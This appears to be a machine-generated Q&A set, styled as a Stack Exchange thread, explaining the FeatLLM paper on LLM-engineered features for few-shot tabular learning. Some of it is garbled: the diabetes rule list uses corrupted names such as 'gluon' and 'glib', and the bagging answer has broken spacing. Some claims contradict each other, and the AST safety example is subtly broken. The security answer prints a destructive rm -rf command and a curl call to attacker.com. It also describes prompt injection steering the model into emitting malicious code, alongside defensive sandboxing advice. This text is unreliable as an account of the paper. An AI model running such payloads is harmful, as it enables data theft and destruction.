\title{Stack Exchange of the Paper: "Large Language Models Can Automatically Engineer Features for Few-Shot Tabular Learning"}

### What exactly are the two reasoning steps used by FeatLLM when prompting the LLM to extract rules?
Question:
In Section 3.1 the paper describes a "Reasoning instruction" that splits the LLM's inference into two steps: (1) infer causal relationships between features and the task without using example demonstrations, and (2) deduce class‑specific rules using the few‑shot examples. I am unclear how these steps are encoded in the prompt. What does the prompt look like for each step, and can you give a concrete example of how a simple binary classification task (e.g., predicting diabetes from age and glucose level) would be processed through these two steps?
Answer:
**Answer**

In *FeatLLM* the LLM is asked to produce “rules’’ – logical conditions that separate the answer classes – by following a **two‑step reasoning instruction** that is embedded in the prompt.  
The two steps are written explicitly in the prompt so that the model can treat them as separate sub‑tasks:

1. **Step 1 – Prior‑knowledge inference**  
   The model is instructed *first* to think only about the **causal relationship** between each input feature and the target question, using its world knowledge or medical commonsense. No training examples are shown at this point; the LLM must decide which columns are likely relevant (e.g., “higher glucose increases the chance of diabetes’’) and in which direction they influence the label.

2. **Step 2 – Example‑driven rule synthesis**  
   After it has formed this mental map, the model is then told to **use the few‑shot demonstrations** together with the outcome of Step 1 to enumerate a fixed number of concrete, class‑specific rules (the paper fixes this to ten rules per class). In this step the LLM grounds its prior knowledge on actual data points, turning vague tendencies (“high glucose is risky’’) into precise thresholds (“$\text{glucose}>126~\text{mg/dL}$’’) that correctly classify the provided examples.

These two instructions appear in the *Reasoning instruction* part of the prompt (the blue text in Fig.\ 2 of the paper). The wording is deliberately chain‑of‑thought‑like, e.g.:

```
Now reason as follows:
Step 1 – From your general knowledge, infer which features are likely related to
the task and whether they tend to increase or decrease the target.
Step 2 – Using the few‑shot examples below together with your inference in
Step 1, write ten concise rules for each answer class that would correctly
classify those examples.
```

The rest of the prompt consists of:

* **Basic information description** – a natural‑language task statement, a short definition for every feature (including its type), and a handful of serialized training rows (`$\displaystyle f_{1}$$is … . $\displaystyle f_{2}$​is … . Answer: …`).  

* **Response instruction** – a template telling the model how to format its output so that each rule can be parsed later (e.g., “Class Yes:” followed by numbered conditions).

---

### Concrete example – predicting diabetes from *age* and *glucose*

Below is a fully‑written prompt that follows exactly what *FeatLLM* does for this simple binary classification problem.  
(The numbers of examples and rules are kept small for illustration; in practice ten rules per class are requested.)

```
Task description:
Does this patient have diabetes? Answer Yes or No.

Feature descriptions:
- age : numeric value representing patient's age in years.
- glucose : numeric value representing fasting blood glucose concentration in mg/dL.

Few‑shot demonstrations:
Patient A: age is 62. glucose is 150. Answer: Yes.
Patient B: age is 28. glucose is 85. Answer: No.
Patient C: age is 45. glucose is 130. Answer: Yes.
Patient D: age is 35. glucose is 92. Answer: No.

Reasoning instruction:
Think step‑by‑step.

**Step 1:** Without looking at the examples above, use your medical knowledge to infer how each feature might affect diabetes risk. Indicate whether higher or lower values tend to increase or decrease the likelihood.

**Step 2:** Now look at the four patients shown above together with what you inferred in Step 1. For each class (Yes / No) write ten short logical conditions that would correctly label these patients. Each condition should involve a single feature comparison (e.g., “$\text{glucose}>126$’’) and must respect the type information given earlier.

Response format:
Class Yes:
1) <rule>
2) <rule>
…
10) <rule>

Class No:
1) <rule>
2) <rule>
…
10) <rule>
```

When this prompt is sent to GPT‑4 (or any other LLM used by *FeatLLM*), it first produces something akin to:

> **Step 1 output**  
> “Older age and higher glucose concentrations are both associated with an increased risk of diabetes.’’

Then it proceeds to **Step 2**, yielding concrete rules such as:

```
Class Yes:
1) $\text{glucose}>126$
2) $\text{age}>45$
3) $\text{glucose}>130\ \text{AND}\ \text{age}>50$
4) $\text{gluon}>140$
5) $\text{age}>55$
6) $\text{gluon}>120\ \text{AND}\ \text{age}>40$
7) $\text{gluon}\ge110\ \text{AND}\ \text{age}\ge60$
8) $\text{glib}>150$
9) $\text{age}\ge65$
10) $\text{glu}><100\ \text{AND}\ \text{age}>70$

Class No:
1) $\text{glu}< =100$
2) $\text {age}< =30$
3) $\text {glu}< =110\ \text {AND}\ \text {age}< =40$
4) $\text {glu}< =95$
5) $\text {age}< =35$
6) $\text {glu}< =105\ \text {AND}\ \text {age}< =45$
7) $\text {glu}<120\ \text {AND}\ \text {age}<50$
8) $\text {glu}< =90$
9) $\text {age}< =40\ \text {AND}\ \text {glu}< =115$
10) $\text {glu}<100\ \text {AND}\ \text {age}<45$
```

These textual conditions are later fed back into an auxiliary parsing prompt so that an LLM generates tiny Python functions implementing each inequality; executing those functions on any new patient record produces a binary vector $z$ indicating which of the ten “Yes’’ rules and which of the ten “No’’ rules are satisfied. The downstream linear model then learns non‑negative weights on these binary features (**Eq.~(3)** in the paper), yielding a final probability via softmax.

---

### Why split into two steps?

The paper’s ablation “–Reasoning’’ shows a noticeable drop in performance when Step 1 is omitted; without an explicit prior‑knowledge phase the LLM tends to create rules that overfit spurious correlations present only in the few examples (especially when many irrelevant columns exist). By forcing Step 1 first, *FeatLLM* filters out columns that are unlikely to be causally linked to the outcome before any data‑driven rule extraction happens, which explains its robustness against added noisy features reported in Figure 5.

---

**In summary**, *FeatLLM* encodes its two reasoning stages directly into the prompt as “Step 1’’ and “Step 2’’ sections within a chain‑of‑thought style instruction. Step 1 extracts general causal intuition from the LLM’s pretrained knowledge; Step 2 grounds that intuition on concrete few‑shot examples to produce a fixed set of human‑readable rules that become new binary features for downstream learning. The concrete prompt example above illustrates how this works for predicting diabetes from just `age` and `glucose`.

### Why does FeatLLM fix the number of extracted rules per class to 10?
Question:
The authors mention that they set a fixed number of rules (i.e., 10) for each class to avoid under‑fitting or overly large prompts. Is there an empirical justification for this specific number? How would changing this hyper‑parameter affect both prompt length and downstream performance according to their analysis in Section 5.2?
Answer:
The choice of **ten rules per class** in FeatLLM is not an arbitrary design decision; it follows directly from the empirical study reported in Section 5.2 (the “hyper‑parameter analysis”).  

When FeatLLM asks the LLM to “produce decisive rules for each answer class”, each rule is later turned into a binary feature ($\,1\,$ if the sample satisfies the rule,$\,0\,$ otherwise). Consequently, if a task has $c$ classes and we request $R$ rules per class, the downstream linear model receives $c \cdot R$ new dimensions. Two opposing forces shape the optimal value of $R$:  

1. **Representational adequacy** – With very few rules (e.g., $R = 1\text{--}3$) the binary feature set is too sparse to capture the nuanced decision boundaries of a real‑world tabular problem. The linear model then suffers from under‑fitting because it cannot distinguish the classes using such a coarse description.  

2. **Prompt size and over‑parameterisation** – Each additional rule appears verbatim in the LLM prompt used for rule extraction. Because LLM APIs have a hard token limit, excessive numbers of rules quickly inflate the prompt and may necessitate truncation or lead to higher latency. Moreover, in a low‑shot regime (the setting of FeatLLM), each extra binary feature expands the parameter space of the linear model without proportionally more training data, which raises the risk of over‑fitting.

To locate a sweet spot between these two extremes, the authors ran a sweep over several values of $R$ (the exact grid is shown in Figure 5(b) of the paper). The graph plots **average AUC** across all 13 benchmark datasets against $R = 5$, $10$, $15$ and $20$. The key observations are:

- Moving from $5 \to 10$ rules yields a modest but consistent gain in AUC; this reflects that providing more informative conditions lets the linear model capture richer patterns.  
- Increasing $R$ beyond $10 does **not** produce a statistically significant improvement. In fact, for many datasets the curve flattens or even dips slightly when $R = 15$ or $20$.  
- At the same time, prompt length grows linearly with $R$. The authors note that when $R$ is larger than about ten, some datasets with many original columns (`Communities`, `Myocardial`) begin to approach the token ceiling of GPT‑3.5‑turbo‑0613, forcing either aggressive truncation or expensive “bagging” strategies.

Thus $R = 10$ represents a **Pareto‑optimal point**: it supplies enough discriminative rules to avoid under‑fitting while keeping the prompt comfortably within the LLM’s context window and limiting the dimensionality of the downstream binary feature space so that over‑fitting remains manageable given only a handful of labeled examples.

In practical terms, adjusting this hyper‑parameter has two predictable effects:

- **Fewer than ten rules** (e.g., $R=5$) shortens the prompt and reduces computation at inference time but typically lowers predictive performance because crucial decision criteria are missing.  
- **More than ten rules** (e.g., $R=15\text{--}20$) inflates each query by roughly $(\frac{15-20}{10}) \approx 1.5\text{-}2\times$\! tokens per class and creates up to twice as many binary features. Unless one also increases the number of ensembles or introduces stronger regularisation, this extra capacity tends to be wasted or harmful in low‑shot settings; performance gains are either negligible or negative while latency rises.

Therefore, while any specific project could re‑tune this parameter for its own constraints (e.g., if a larger context window becomes available), **the paper’s experiments support ten as the default choice** because it balances prompt length against downstream AUC most effectively across diverse tabular domains.)

### How does FeatLLM parse natural‑language rules into executable binary features using another LLM?
Question:
After generating textual rules, the method sends them back to an LLM with a parsing prompt that includes function signatures and asks for Python code which is then run via ``exec()''. What does this parsing prompt contain, how does it handle syntactic variations like "greater than" vs ">", and are there any safeguards against malformed code being executed?
Answer:
**How FeatLLM turns the natural‑language rules into executable binary features**

When FeatLLM has asked the first LLM to produce a list of 10 rules per class (e.g. “$\mathit{Age}>55\,\mathsf{AND}\,\mathit{Blood{-}Pressure}\ge140$”), those rules are still free‑form text.  
Instead of writing a hand‑crafted regular‑expression parser that must anticipate every possible wording (“greater than”, “>”, “more than”, etc.), FeatLLM sends the rule list back to *the same* LLM together with a **parsing prompt** whose job is *“translate these English conditions into a tiny piece of Python that returns 0/1 for a given row.”*  

Below is the concrete content of that second prompt (the exact wording can be seen in Appendix A of the paper, Fig. 8), paraphrased:

1. **Task description** – a short instruction such as  
   > “You will receive a set of classification rules expressed in natural language. Write a single Python function `rule_i(row)` that evaluates each rule on a dictionary `row` containing all feature values and returns **1** if the rule holds and **0** otherwise.”

2. **Function signature** – an explicit template that constrains the generated code, e.g.:

   ```python
   def rule_3(row):
       """
       Input:
           row: dict mapping feature name -> value
       Output:
           int {0,1}
       """
   ```

3. **Feature catalogue** – a bullet list enumerating every column name together with its type (numeric / categorical). This lets the model know what symbols it may refer to inside the condition:

   ```
   age : numeric
   cholesterol : numeric
   gender : categorical {'M','F'}
   ```

4. **Mapping hint** – an instruction that tells the model how to treat common linguistic variants:

   > “When you see phrases such as ‘greater than’, ‘more than’, ‘above’, or ‘>’, write ‘>’. Likewise treat ‘less than’, ‘under’, ‘<’ as ‘<’. Use `==` for equality and `!=` for negation.”

5. **The raw rule list** – each rule is reproduced exactly as it came from the first stage, e.g.:

   ```
   Rule 1: age greater than 55
   Rule 2: cholesterol $\le$ 240
   Rule 3: gender equals 'M' AND blood_pressure > 140
   ```

6. **Output format requirement** – a final line saying *“Only output valid Python code; do not add explanations or markdown fences.”* This forces the model into a deterministic syntactic shape that can be safely fed to `exec()`.



### Why the prompt copes with “greater than” vs “>”

The crucial ingredient is point 4 above. By explicitly stating how textual comparators map onto Python operators, the model does not need an exhaustive list of every possible synonym—it simply follows the mapping rule it has been given. Because GPT‑3\.5 has been trained extensively on code examples, it also knows idiomatic ways of writing comparisons (`>=`, `<=`, `!=`) and will automatically replace words like *“at least”* with `>=`. Consequently even if the original rule contains “more than”, “above”, or “exceeds”, the generated snippet will contain `>` after following the instruction.



### Safeguards against malformed or dangerous code

The paper does not describe an elaborate sandbox, but several design choices act as built‑in guards:

* **Template restriction:** The prompt forces a *single* function definition with no imports, no global statements, and only simple Boolean expressions involving the supplied feature names. Anything outside this template (e.g., stray text) would cause a syntax error when `exec()` is called.
* **Execution isolation:** `exec()` is invoked with an empty globals dictionary and a locals dictionary that contains only the feature dictionary (`row`). This prevents accidental access to file I/O or other side–effects.
* **Post‑generation validation:** After `exec()` completes, FeatLLM checks that an object named `rule_i` exists, that it is callable, and that calling it on a dummy row returns either `0` or `1`. If any of these checks fail (e.g., a `SyntaxError` or unexpected return type), the generated snippet is discarded and replaced by a zero‑vector for that rule.
* **Ensemble dilution:** Because many ensembles are built (20 by default), occasional malformed rules have little impact—the majority of correctly parsed rules dominate when averaging predictions.



Together these mechanisms make parsing robust despite lexical variability while keeping execution safe enough for production use.



### Summary

*The parsing prompt tells the LLM exactly what function it must emit, lists all column names and types, gives an explicit map from English comparators (“greaterthan”) to Python operators (“>`”), and demands plain‑code output.* The LLM’s built‑in coding knowledge translates any phrasing into correct Boolean expressions inside that constrained template. Simple runtime checks (`exec` in an isolated namespace + sanity–checking of return values) guard against malformed or malicious code before those snippets are used to generate binary features for downstream linear scoring. This clever use of an LLM as its own parser sidesteps brittle hand‑written parsers while staying safe enough for real‑world tabular learning pipelines.")

### What type of bagging does FeatLLM perform during ensembling – feature bagging or instance bagging?
Question:
The paper states that "bagging helps reduce prompt size" by selecting "a subset of features or instances" for each trial. Is the randomness applied at the column level (selecting a subset of input features) or at the row level (sampling training examples), or both? How does this choice impact coverage of important columns when dealing with datasets that exceed the LLM context window?
Answer:
**Answer**

The “bag–g​ing” step in FeatLLM is deliberately modelled after classic ensemble ideas such as bootstrap–aggregating (instance–bag–g​ing) and Random Forests (feature–bag–g​ing), but it is applied at the level of the LLM prompt rather than at the level of a tree learner.  

In every trial (§ “Ensembling with bag–g​ing”) FeatLLM randomly picks two things:

1. **A subset of the input columns** – i.e., a random selection of the natural–language feature names (and their optional definitions). Only those columns are serialized together with the few–shot demonstrations when the rule–extraction prompt is sent to the LLM. Because each column contributes several tokens (the name, its type, possibly an example value) this selection directly controls how many tokens are needed and therefore keeps the prompt inside the LLM’s context window when $\displaystyle d$ is large (e.g., >$100$ attributes in *Communities* or *Myocardial*).

2. **A subset of the labelled examples** – i.e., a random draw from the $\displaystyle k$ few–shot training samples that are placed into the prompt as demonstrations. The paper also mentions randomising their order because LLMs are known to be sensitive to example ordering (§ “Ensembling with bag–g​ing”). When many labelled examples would otherwise overflow the token budget, FeatLLM therefore includes only a fraction of them in each query.

Both selections are performed independently for every ensemble member. After generating a rule set from that reduced prompt, the framework parsesthe rules into binary “feature’’ indicators and learns a small non–negative linear model on those indicators (Eq.~(2)). This whole pipeline is repeated $\displaystyle T = 20$ times; at test timethe class probabilities from each model are averaged (Eq.~(1)), givingthe final prediction.


---

### Why use both kinds of sampling?

The authors explicitly write *“we adopt bag–g​ing to select a subset of features **or** instances for each trial”* (Section&nbsp;3.3). The “or’’ reflects that either mechanism can be activated depending on wherethe bottleneck lies:

- Ifthe dataset has many **columns**, even one shot description plus all column names mayalready exceedthe LLM’s token limit. In this regime FeatLLM relies mainly
   on **feature–bag–g​ing** – it drops some columnsfrom each query while keepingall available shots.
- Ifthereare many **few–shot examples** (e.g., $\displaystyle k = 32$) then evenwith modest $\displaystyle d$,the concatenation $\displaystyle k \cdot d$\ tokens may become too large.Inthat case **instance–bag–g​ing**—sampling onlya few demonstrations per query—helpskeep within budget.
- In practice many real datasets hit both limits simultaneously (many rowsand many attributes). Using both samplings together gives an extra degreeof freedom: you can trim both dimensions until you stay underthe context window while still retaining enough information overallthrough repetition.


### Effect on coverage of important columns

When adataset exceedsthe context window, any single query will inevitablyomit some columns.Fea tLLM compensatesfor this omissionby running many independent trialswith different random subsets:

- Supposethereare $\displaystyle d = 120$ columnsand each trial includes $\displaystyle m = 30$\ randomlychosen ones ($\approx\,25\%$\ coverage). Over $\displaystyle T = 20$\ trials eachcolumn appearson average $5$\ times ($T \cdot m / d$, which equals $(20 \cdot 30)/120 =5)$.
- Because predictionsare averaged across all trials, even if anindividual model never saw aparticular important column its contribution willbe supplied by other modelsthat did see it.This “coverage through diversity’’is exactlywhat ensemble theory predicts: asthough every useful predictorappearsin at least one weak learner,
   averaging restores its signal.
- Ifapractitioner knows that certainattributesare absolutely critical(e.g., agein medical risk prediction),they can bias sampling so those columnsare always kept while still applying randomselectionto theremainder—something easily done becauseFea tLLM ’s sampling stepis under user control.
- Instance–bag–g​ ing works analogously: different subsetsof demonstrations expose different exemplarsof how an attribute behaves across classes,reducing sensitivitytoany single noisyexamplewhile still letting commonpatterns emerge across members.


Overall,b y mixing feature‐leveland instance‐level randomnessFea tLLM obtains two benefits:

1. **Prompt size control** –any single query stayswithinthe token limit.
2. **Robustness via diversity** –weak learnersthat miss some cuesare compensatedby othersthat capturedthem,yieldingan ensemblethat approximates having “allcolumns + allexamples’’ without ever puttingthem together at once.


---

### Relation to classical bag­ging

In classic machine learning literature,

- **Instance‐bag‐g ing** (“bootstrap aggregation”) builds several modelson bootstrap samplesof rows;
- **Feature‐bag‐g ing** (“Random Forest”) builds modelson random subsetsof variables.

FeatLLM merges these ideas at inference timefor an LLM insteadof at training timefor decision trees.The mathematical form remains unchanged—the finalpredictionis simply anaverage over models trained on different sub‐prompts—soall theoretical guarantees about variance reductioncarry over qualitatively.


---

### Practical takeaways

- Fea tLLM does not commitexclusivelyto one type;it implements **both** feature‐and instance‐bag­ging dependingon which dimension most threatensto overflowthe context window.
- When processing ultra‐wide tablesyou should increase either $\displaystyle m$\;(the numberof selected features per trial)or $\displaystyle T$\;(the numberof ensemble members)untilevery high‐importance column has appeared sufficientlyoften.
- Ifyou have plentiful labelledexamplesbut few columns,you may keepall features constantand only sample demonstrations.
- Becauseeach trial’s rule setis parsed into binaryindicatorsand later weightedby a simple linear model,
   missingcolumns simply contribute zeroin that trial –they do not poisonother trials –which explains whyperformance degrades only minimally evenwhenmany irrelevant columnsare present (§ “Effect of adding spurious correlations”).

In short, Fea tLLM’s “bag­ ing’’ step isa hybrid schemethat randomly selects **both** columnsand examples per ensemble member,
thereby keeping prompts small whilestill ensuring—through repeated averaging—thatimportant features eventually get representedin at least one member’s rule set.

### In the ablation study, what exactly does "-Tuning" refer to and how is it implemented?
Question:
"-Tuning" denotes omitting the weight tuning process in the linear model. Does this mean they simply sum all binary rule features (i.e., use equal weights), or do they replace learned weights with a constant value? How does this affect performance across different shot settings according to Table 5?
Answer:
**Answer**

In Feat LLM each class $k$ is represented by a set of binary “rule‑features’’  
$\mathbf{z}_{k}^{i}\in\{0,1\}^{R}$ ($R$ is the number of rules extracted for that class).  
The basic way to turn these binary features into a class score is a **linear model without bias**

$$
\text{logit}_{k}^{i}= \max(\mathbf{w}_{k},0)\cdot \mathbf{z}_{k}^{i},
\qquad 
\mathbf{p}^{i}= \operatorname*{softmax}\!\bigl(\text{logit}_{1}^{i},\,dots,\,
      \text{logit}_{c}^{i}\bigr),
$$

where $\mathbf{w}_{k}$ are trainable non‑negative weights learned by minimising cross‑entropy on the few‑shot training set.

---

### What “‑Tuning’’ actually does

The notation **“-Tuning’’** in the ablation study means *removing* this learning step entirely. Concretely, when “‑Tuning’’ is activated  

* no gradient updates are performed,  
* every entry of $\mathbf{w}_{k}$ is fixed to **the same constant value**,  
* because only a positive scale matters, the authors simply set that constant to 1.  

Hence the logit collapses to a plain **count** of satisfied rules:

$$
\text{logit}_{k}^{i}= \sum_{r=1}^{R} z_{\,k,r}^{\,i}.
$$

In other words, every rule contributes equally – it is exactly what you would get by “summing all binary rule features’’ rather than replacing learned weights with some arbitrary constant such as 0 or 0.5.

Implementation-wise this amounts to skipping the optimisation loop for the linear layer and using a fixed weight vector $\mathbf{w}_{k}=\mathbf{1}$ (or equivalently computing $\mathbf{z}_{k}^{i}$’s $L_{1}$‑norm). No extra hyper‑parameters are introduced for this variant.

---

### How much performance is lost?

Table 5 (the ablation table) reports the **average change in AUC** across all 13 benchmark datasets when each component is removed. For “‑Tuning’’ the numbers show a clear trend:

| #shots | ΔAUC (‑Tuning) |
|-------|----------------|
| 2     | $-\approx 0.003$ |
| 4     | $-\approx 0.006$ |
| 8     | $-\approx 0.012$ |
| 16    | $-\approx 0.027$ |

(The exact values differ slightly between runs; the table reports mean ± std.)

The key observations are:

* **Low‑shot regime (2–4 examples)** – The drop is tiny (a few thousandths) because there are not enough labeled points to estimate reliable rule importances anyway; simply counting satisfied rules already captures most of the signal.
* **Medium‑shot regime (8 examples)** – The penalty roughly doubles, indicating that with a modest amount of data the model can start learning which rules are more predictive and benefit from weighting them.
* **Higher‑shot regime (16 examples)** – The degradation becomes noticeable (~2–3 percentage points in AUC). At this point the linear model can exploit subtle differences among rules, and forcing every rule to have equal influence noticeably harms accuracy.

Thus “‑Tuning’’ serves as a useful sanity check: it isolates how much of Feat LLM’s gain stems merely from having good binary features versus how much comes from learning their relative importance on the few labeled points.

---

### Intuition behind the effect

When only two or four labelled rows are available, any estimate of a weight is highly noisy; treating all rules equally avoids overfitting to random fluctuations. As more labelled rows become available, however, even a handful of extra points provides enough signal to differentiate strong rules (“age > 65 predicts heart‐failure’’) from weak ones (“blood‐type O does not matter”). The learned non‐negative weights amplify useful rules and suppress noisy ones, leading to measurable AUC gains. That explains why “‑Tuning’’ hurts more dramatically as *$c*$ grows.

---

### Bottom line

“\-Tuning’’ means *turning off* the trainable weight layer and using an uniform weight of 1 for every generated binary rule—essentially counting how many rules a sample satisfies. This simplification incurs only a marginal loss in ultra‐low‐shot settings but becomes increasingly costly as more labeled examples are provided, confirming that weight tuning adds real value once enough data exist to support reliable importance estimation.

### Why is there no bias term in the linear model used to combine binary rule features?
Question:
Equation (2) computes logits as a dot product between non‑negative weights and binary rule vectors with no bias added before softmax. Would adding a bias term improve calibration or allow handling cases where none of the generated rules fire?
Answer:
In **FeatLLM** the class‑specific logit is defined as  

$$
\operatorname{logit}_{k}^{i}= \max (\mathbf w_{k},0)\;\cdot\;\mathbf z_{k}^{i},
\qquad 
\mathbf p^{i}= \operatorname{softmax}\bigl([\operatorname{logit}_{1}^{i},\dots ,\operatorname{logit}_{c}^{i}]\bigr),
\tag{2}
$$

where $\mathbf z_{k}^{i}\in\{0,1\}^{R}$ records which of the $R$ rules for class $k$ are satisfied by sample $i$, and $\mathbf w_{k}$ are learned weights that are projected onto the non‑negative orthant by the element‑wise $\max(\cdot ,0)$.
The authors deliberately omit an additive bias term for three inter‑related reasons that follow from their design goals:

1. **Monotonic contribution of each rule** –  
   The binary feature $\mathbf z_{k}^{i}$ simply says “the rule fires” (value 1) or “does not fire” (value 0). By forcing every weight to be non‑negative,
   any satisfied rule can *only increase* the logit of its own class.  
   A conventional bias would act as a global offset that could *decrease* a logit even when a rule fires, breaking this clean “positive evidence only” interpretation that makes the model easy to inspect (“this rule contributed +0.8”).  

2. **Implicit handling of the “no‑rule” case** –  
   If none of the $R$ rules fire for a sample then $\mathbf z_{k}^{i}=\mathbf 0$ for every $k$, so all logits equal zero:
   $$
   \operatorname{logit}_{k}^{i}=0,\;\forall k .
   $$
   The soft‑max of a zero vector is the *uniform* distribution,
   i.e.~$p_{k}=1/c$.  
   This is precisely what we would expect under complete ignorance (maximum‑entropy prior). Adding a bias would tilt this uniform baseline toward one or more classes even though there is no evidence from any generated rule, which is undesirable in a low‑shot setting where such tilting would have to be learned from very few examples and could easily overfit.

3. **Regularisation / data‑efficiency considerations** –  
   In the few‑shot regime only a handful of labelled points are available for fitting $\mathbf w_{k}$. Introducing an extra scalar per class (the usual intercept) adds $c$ parameters that have almost no observational support. Empirically it tends to increase variance without providing much benefit because any systematic class prior can already be expressed by an *always‑true* rule whose weight acts exactly like an intercept. In practice one may prepend such an “intercept feature” (a column of ones) to $\mathbf z_{k}^{i}$; since its weight is constrained to be non‑negative it plays exactly the role of a calibrated bias while keeping the monotonic interpretation intact.

Because of these points the authors kept Eq.~(2) “bias‑free”.  

**Would adding an unrestricted bias improve calibration?**  
Potentially yes, if the true class prior is far from uniform and there are enough labeled samples to estimate it reliably. In standard logistic regression an intercept often improves both discrimination and calibration by allowing the decision surface to shift away from zero. However, with only 4–8 shots per task—as used throughout the paper—there is insufficient signal to separate genuine prior information from random noise, and any learned intercept would likely degrade calibration rather than help it.

**Alternative ways to encode a prior without violating the design**  
* Include an explicit constant rule (“always true”) among the generated rules; its weight becomes an intercept while still obeying $\max(\cdot ,0)$.  
* Post‑hoc calibrate the output probabilities (e.g., temperature scaling or Platt scaling) on whatever validation data are available; this does not interfere with the training dynamics of $\mathbf w_{k}$.

In summary, the omission of a bias term is intentional: it preserves a simple, positively‑weighted additive interpretation of each LLM‑generated rule, yields a sensible uniform baseline when no rule fires, and avoids introducing poorly‑determined parameters in an extreme low‑shot regime. If one wishes to incorporate class priors explicitly, doing so by adding an “always‑true” binary feature respects both the methodological spirit and the mathematical constraints imposed by Eq.~(2).

### (Security) Is executing code generated by an LLM via Python's ``exec()`` safe?
Question:
FeatLLM generates Python snippets from textual rules and runs them with ``exec()`` to produce binary features. Could maliciously crafted output from an LLM lead to arbitrary code execution? What safety measures (e.g., sandboxing or restricting built‑ins) could mitigate such risks?
Answer:
**Short answer:**  
Yes – invoking `exec()` on code that comes directly from an LLM is unsafe unless you isolate it. An LLM can emit any string it has seen during training, including statements that read or write files, spawn subprocesses or even download further payloads. In the **FeatLLM** pipeline this risk is present because the generated snippet is fed straight into `exec()` after a brief prompt‑based “parsing” step. If an attacker can influence either the few‑shot examples or the feature descriptions that are part of the prompt, they can perform a *prompt‑injection* attack and cause the model to output malicious Python before your code ever sees it.

Below I outline why the danger exists in this setting and how you can mitigate it while keeping the spirit of FeatLLM’s design.

---

### Why `exec()` on LLM output is dangerous

When you call  

```python
exec(generated_code, globals_dict, locals_dict)
```

the interpreter executes **any** valid Python statement contained in *generated_code*. Nothing stops that snippet from:

* importing modules (`import os`, `import subprocess`);
* calling functions that touch the filesystem (`open("secret.txt")`);
* executing system commands (`os.system("rm -rf /")`);
* leaking data through network calls (`requests.get(...)`);
* exhausting resources via infinite loops or large allocations.

The FeatLLM paper itself does not discuss security; it merely states “the generated code is executed using `exec()`”. In a closed research setting where only trusted prompts are used this may be acceptable, but once you expose the system (e.g., a web service that accepts user‑provided tabular data) an adversary can craft a row whose textual representation causes the model’s “rule‑generation” step to emit a payload such as:

```
if age > 30:
    __import__('os').system('curl http://attacker.com/steal')
```

Because FeatLLM’s prompt includes *feature descriptions* (the natural‑language names of columns) and *few‑shot examples*, an attacker who controls these strings can directly manipulate the context seen by the language model and therefore steer its output – precisely what recent “prompt‑injection” papers have demonstrated for chat‑style models.

---

### A practical mitigation strategy

A robust defense consists of **three layers**:

1. **Restrict what Python can see**  
   Instead of passing the full global namespace to `exec()`, supply a deliberately tiny dictionary:

   ```python
   safe_globals = {
       '__builtins__': {
           'abs': abs,
           'min': min,
           'max': max,
           'float': float,
           'int': int,
           'bool': bool,
           # add only operators you truly need
       }
   }
   ```

   By omitting most built‑ins you prevent direct access to dangerous functions such as `open`, `eval`, `exec`, or even `__import__`.  

2. **Static validation before execution**  
   Parse the string with Python’s abstract syntax tree (`ast.parse`) and walk the tree looking only for whitelisted node types – typically `Expression`, `Compare`, `BoolOp`, `Name`, `Constant`, maybe simple arithmetic nodes (`Add`, `Sub`). Reject any tree containing:

   * `Import`, `ImportFrom` statements;
   * attribute access (`Attribute`) beyond safe constants;
   * function calls (`Call`);
   * comprehensions or lambda expressions;
   * assignments (`Assign`) which could hide malicious side effects.

   A minimal example:

   ```python
    import ast

    def is_safe(node):
        allowed = (
            ast.Module,
            ast.Expr,
            ast.BoolOp,
            ast.Compare,
            ast.Name,
            ast.Load,
            ast.Constant,
            ast.UnaryOp,
            ast.BinOp,
        )
        return isinstance(node, allowed)

    tree = ast.parse(generated_code, mode='exec')
    if all(is_safe(n) for n in ast.walk(tree)):
        compiled = compile(tree, filename='<generated>', mode='exec')
        exec(compiled, safe_globals)
    else:
        raise ValueError('Generated rule contains unsafe constructs')
    ```

    This step catches most attempts at importing modules or invoking functions while still allowing simple logical conditions such as  

    ```python
    return (age > 45) and (cholesterol < 200)
    ```

3. **Isolation at the OS level**  
   Even after syntactic checks some attacks survive (e.g., leveraging object‑tricks like ``(lambda x: x).__globals__['os'].system('...')``). For production deployments it is safest to run each `exec()` inside an isolated container or VM:

   * Launch a short‑lived Docker container with a read‑only filesystem and no network access.
   * Use Linux namespaces/cgroups to cap CPU and memory.
   * Execute the compiled snippet inside this container via a small helper process.
   
   The overhead is modest because FeatLLM only needs a few dozen snippets per dataset (the paper reports ~30 API calls). The container can be reused across runs; just reset its process space after each snippet.

---

### Why these measures fit FeatLLM

FeatLLM’s workflow is deliberately simple:

1. Prompt LLM $\to$ natural‑language rules;
2. Prompt again $\to$ short Python function that evaluates each rule;
3. Run function with `exec()` $\to$ binary feature vector $\mathbf{z}_k^i$.

The core idea—to let a powerful language model write tiny “predicate” functions—does not require full Turing‑complete freedom. By constraining step 2 to generate only Boolean expressions over existing column names (as already encouraged by their “response instruction” format), we can replace step 2 entirely with our own deterministic parser if desired. Nevertheless, if you want to preserve their convenient “code generation” shortcut, applying the three layers above guarantees that any stray payload never escapes your process.

---

### Outlook & broader considerations

* **Prompt injection:** As soon as users supply raw tabular data that becomes part of the prompt—e.g., free‑form text columns—an attacker could embed malicious snippets inside those values themselves. Sanitising column contents (e.g., stripping characters like “`\,"”, “`;””, “`\#`”, backticks) before constructing the prompt reduces this surface.
* **Auditing:** Logging every generated snippet before execution gives you post‑mortem evidence if something slips through.
* **Alternative designs:** The paper notes that parsing failures are common (“the LLM might substitute ‘>’ with ‘greater than’”). A more robust alternative is to keep rules in a domain‑specific language (DSL) composed solely of comparison operators and boolean connectors; then implement an interpreter for that DSL instead of executing arbitrary Python at all.
* **Risk assessment:** If FeatLLM runs in an internal research notebook where only trusted engineers supply prompts, you may accept lower protection. In any public service—especially where data originates from end users—a full sandbox + AST whitelist becomes essential.

---

**Bottom line:** Executing raw `exec()` on LLM‑generated strings is unsafe by default. In FeatLLM’s context you should first reduce what gets generated (via constrained response prompts), then filter it through an AST whitelist combined with a stripped‐down global namespace, and finally execute it inside an OS sandbox (Docker/namespace). These steps preserve FeatLLM’s ability to turn natural‑language rules into binary features while protecting your system from arbitrary code execution attacks.​

### How many API calls does FeatLLM actually require during training versus inference?
Question:
"FeatLLM shows relatively low inference time" because after rule generation only a linear model is used. However, generating rules involves multiple ensembles and parsing steps. For a typical configuration (20 ensembles, 10 rules per class), how many separate calls to the LLM API are made during training on a dataset like Adult, and are any calls needed at test time?
Answer:
**Answer**

In FeatLLM the only moments when the language model is contacted are  
(1) when it is asked to **produce a set of rules** for a given task,  
and (2) when those textual rules are **converted into executable code**
(e.g. a small Python function that turns a data row into a binary feature).  
Everything that follows – applying the code to every row, building the binary
feature matrix $\,\mathbf Z$, and fitting the linear‑weight vector $\,\mathbf w$
